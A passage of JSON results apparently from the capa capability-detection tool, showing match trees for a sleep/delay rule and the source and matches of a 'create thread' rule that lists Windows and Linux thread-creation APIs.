                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651786051
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651786056
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651789456
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651789484
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651792158
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651792163
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651792178
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651792201
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651801232
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651801248
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create thread": {
        "meta": {
          "name": "create thread",
          "namespace": "host-interaction/thread/create",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com",
            "joakim@intezer.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Create Thread"
              ],
              "objective": "Process",
              "behavior": "Create Thread",
              "method": "",
              "id": "C0038"
            }
          ],
          "references": [],
          "examples": [
            "946A99F36A46D335DEC080D9A4371940:0x10001DA0",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x408020"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create thread\r\n    namespace: host-interaction/thread/create\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n      - joakim@intezer.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Process::Create Thread [C0038]\r\n    examples:\r\n      - 946A99F36A46D335DEC080D9A4371940:0x10001DA0\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x408020\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - or:\r\n          - api: kernel32.CreateThread\r\n          - api: _beginthread\r\n          - api: _beginthreadex\r\n          - api: PsCreateSystemThread\r\n          - api: SHCreateThread\r\n          - api: SHCreateThreadWithHandle\r\n          - api: kernel32.CreateRemoteThread\r\n          - api: kernel32.CreateRemoteThreadEx\r\n          - api: RtlCreateUserThread\r\n          - api: ntdll.NtCreateThread\r\n          - api: ntdll.NtCreateThreadEx\r\n          - api: ntdll.ZwCreateThread\r\n          - api: ntdll.ZwCreateThreadEx\r\n      - and:\r\n        - or:\r\n          - os: linux\r\n          - os: android\r\n        - api: pthread_create\r\n      - and:\r\n        - api: System.Threading.Thread::Start\r\n        - optional:\r\n          - api: System.Threading.Thread::ctor\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651774520
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
